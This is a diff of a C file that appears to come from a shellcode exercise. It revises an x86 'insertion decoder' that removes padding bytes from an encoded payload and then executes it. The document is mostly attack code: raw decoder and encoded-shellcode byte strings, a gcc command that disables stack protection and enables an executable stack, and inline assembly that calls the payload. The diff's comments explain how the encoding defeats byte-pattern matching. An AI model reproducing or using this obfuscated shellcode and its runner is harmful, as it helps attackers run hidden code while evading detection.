@@ -25,8 +25,13 @@
 
    insertion_decoder_shellcode
 
-   *  bytes
-   * null-free
+  * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
+  * null-free
+  * decodes any pattern of garbage insertion
+      Eg: True Byte = X, Garbage Byte = _
+           _ X _ X _ ...
+           X _ _ X X ...
+           X X X _ _ ... 
 
 
    # gcc -m32 -fno-stack-protector -z execstack insertion_decoder_shellcode.c -o insertion_decoder_shellcode
@@ -44,9 +49,12 @@ unsigned char shellcode[] = \
 
   // Shellcode Decoder (33 bytes)
 "\xeb\x1a\x5e\x8d\x3e\x31\xc9\x8b\x1c\x0e"
-"\x66\x81\xfb\xf1\xf1\x74\x10\x41\x80\xfb"
-"\x3f\x74\xf0\x88\x1f\x47\xeb\xeb\xe8\xe1"
-"\xff\xff\xff"
+"\x66\x81\xfb"
+"\xf1\xf1"   // <- End Signature
+"\x74\x10\x41\x80\xfb"
+"\x3f"       // <- Garbage Byte
+"\x74\xf0\x88\x1f\x47\xeb\xeb\xe8\xe1\xff"
+"\xff\xff"
 
   // Encoded shellcode (length depends of the shellcode plus garbage bytes)
 "\x3f\x3f\x3f\x31\x3f\xc9\x3f\xf7\xe1\x3f"
@@ -55,11 +63,8 @@ unsigned char shellcode[] = \
 "\x3f\xe3\xcd\x3f\x80\xf1\xf1";
 
 
-//int signature = &shellcode + sizeof(shellcode) - 1;
-
 main ()
 {
-
 
         // When contains null bytes, printf will show a wrong shellcode length.
 
@@ -74,9 +79,6 @@ main ()
 		 "movl %eax, %esi\n\t"
 		 "movl %eax, %edi\n\t"
 		 "movl %eax, %ebp\n\t"
-
-		 // Setting the end signature
-		// "movl $0x90F2, (signature)\n\t"
 
 		 // Calling the shellcode
 		 "call shellcode");
